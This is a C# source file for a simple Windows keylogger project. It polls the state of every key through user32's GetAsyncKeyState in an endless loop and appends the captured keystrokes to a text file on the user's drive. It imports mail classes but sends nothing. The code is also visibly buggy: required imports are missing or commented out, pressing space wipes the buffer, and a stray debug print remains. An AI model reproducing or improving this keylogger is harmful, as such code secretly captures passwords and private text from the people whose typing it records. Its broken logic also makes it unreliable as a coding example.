using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
//using System.Windows.Form;
using System.Net.Mail;
using System.Net;


namespace testkeylogger
{
    class Program
    {
        FileStream open = File.Create(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\testkeylogger\keylogger.txt");
        private static string buffer = "";
        [STAThread]
        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    if (GetAsyncKeyState(i) != 0)
                    {
                        buffer += ((Keys)i).ToString();
                        if (((Keys)i) == Keys.Space)
                        {
                            buffer = " ";
                            continue;
                        }
                        if (((Keys)i) == Keys.Enter)
                        {
                            buffer += "\r\n";
                            continue;
                        }
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton)
                        {
                            continue;
                        }
                        if (((Keys)i).ToString().Length == 1)
                        {
                            buffer += ((Keys)i).ToString();
                            Console.Write("HERE");
                        }
                        if (buffer.Length > 10)
                        {
                            File.AppendAllText(@"C:\Users\alyje\OneDrive\Pictures\Documents\C#\testkeylogger\keylogger.txt", buffer);
                            buffer = "";
                        }
                        
                    }
                }

            }
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    }


}